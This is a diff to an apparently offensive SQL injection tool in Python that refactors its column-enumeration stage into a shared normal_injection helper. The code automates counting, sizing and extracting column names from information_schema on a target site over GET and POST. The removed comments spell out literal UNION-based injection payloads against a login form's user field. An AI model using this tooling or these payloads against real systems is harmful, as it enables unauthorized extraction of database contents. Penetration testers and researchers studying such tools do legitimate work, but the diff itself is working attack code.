@@ -3,6 +3,7 @@
 from sqlier.config import UnpackFunction
 from lib.dealpayload import build_injection
 from lib.dealpayload import time_injection
+from lib.dealpayload import normal_injection
 from lib.log import logger
 from tables import SqliTables
 from tqdm import trange
@@ -46,12 +47,14 @@ class SqliColumns(SqliTables):
                         logger.debug("Start table's %s column amount sqli..." % table_name)
 
                         # 先注columns的数量
-                        # payload = "user=ddog' union all SELECT 1,COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit 0,1%23&passwd=ddog123&submit=Log+In"
-                        payload = self.dealpayload.construct_normal_payload(select="COUNT(column_name)",
-                                                                            source="information_schema.columns",
-                                                                            conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'")
-                        r = self.Data.GetData(payload)
-                        columns_number = int(UnpackFunction(r))
+
+                        columns_number = normal_injection(select='COUNT(*)',
+                                                          source="information_schema.columns",
+                                                          conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                          dealpayload=self.dealpayload,
+                                                          data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                          )
+
                         logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
                         logger.info("[*] columns_number: %d" % columns_number)
 
@@ -59,25 +62,28 @@ class SqliColumns(SqliTables):
                         for i in trange(int(columns_number), desc="Column sqli...", leave=False, disable=True):
                             # 首先是column name的长度
                             logger.debug("Start %dth column length sqli..." % (i + 1))
-                            # payload = "user=ddog' union all SELECT 1,length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(i) + ",1%23&passwd=ddog123&submit=Log+In"
-                            payload = self.dealpayload.construct_normal_payload(select="length(column_name)",
-                                                                                source="information_schema.columns",
-                                                                                conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                                                limit=i)
-                            r = self.Data.GetData(payload)
-                            column_name_len = int(UnpackFunction(r))
+
+                            column_name_len = normal_injection(select='length(column_name)',
+                                                               source="information_schema.columns",
+                                                               conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                               limit=i,
+                                                               dealpayload=self.dealpayload,
+                                                               data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                               )
 
                             logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                             logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
 
                             # 然后注columns name
-                            # payload = "user=ddog' union all SELECT 1,column_name from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(i) + ",1%23&passwd=ddog123&submit=Log+In"
-                            payload = self.dealpayload.construct_normal_payload(select="column_name",
-                                                                                source="information_schema.columns",
-                                                                                conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                                                limit=i)
-                            r = self.Data.GetData(payload)
-                            column_name = UnpackFunction(r)
+
+                            column_name = normal_injection(select='column_name',
+                                                           source='information_schema.columns',
+                                                           conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                           limit=i,
+                                                           dealpayload=self.dealpayload,
+                                                           data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                                           )
+
                             logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
 
                             # 把columns_name插入列表
@@ -196,14 +202,14 @@ class SqliColumns(SqliTables):
                         logger.debug("Start table's %s column amount sqli..." % table_name)
 
                         # 先注columns的数量
-                        # payload = {
-                        #     "user": "admi' union all SELECT 1,COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit 0,1#",
-                        #     "passwd": "ddog123"}
-                        payload = self.dealpayload.construct_normal_payload(select="COUNT(column_name)",
-                                                                            source="information_schema.columns",
-                                                                            conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'")
-                        r = self.Data.PostData(payload)
-                        columns_number = int(UnpackFunction(r))
+
+                        columns_number = normal_injection(select='COUNT(*)',
+                                                          source="information_schema.columns",
+                                                          conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                          dealpayload=self.dealpayload,
+                                                          data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                          )
+
                         logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
                         logger.info("[*] columns_number: %d" % columns_number)
 
@@ -212,29 +218,29 @@ class SqliColumns(SqliTables):
 
                             # 首先是column name的长度
                             logger.debug("Start %dth column length sqli..." % (i + 1))
-                            # payload = {
-                            #     "user": "ddog' union all SELECT 1,length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
-                            #         i) + ",1#", "passwd": "ddog123&submit=Log+In"}
-                            payload = self.dealpayload.construct_normal_payload(select="length(column_name)",
-                                                                                source="information_schema.columns",
-                                                                                conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                                                limit=i)
-                            r = self.Data.PostData(payload)
-                            column_name_len = int(UnpackFunction(r))
+
+                            column_name_len = normal_injection(select='length(column_name)',
+                                                               source="information_schema.columns",
+                                                               conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                               limit=i,
+                                                               dealpayload=self.dealpayload,
+                                                               data=self.Data, isCount=True,
+                                                               sqlirequest=self.sqlirequest
+                                                               )
 
                             logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                             logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
 
                             # 然后注columns_name
-                            # payload = {
-                            #     "user": "ddog' union all SELECT 1,column_name from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
-                            #         i) + ",1#", "passwd": "ddog123"}
-                            payload = self.dealpayload.construct_normal_payload(select="column_name",
-                                                                                source="information_schema.columns",
-                                                                                conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                                                limit=i)
-                            r = self.Data.PostData(payload)
-                            column_name = UnpackFunction(r)
+
+                            column_name = normal_injection(select='column_name',
+                                                           source='information_schema.columns',
+                                                           conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                           limit=i,
+                                                           dealpayload=self.dealpayload,
+                                                           data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                                           )
+
                             logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
 
                             # 把columns_name插入列表
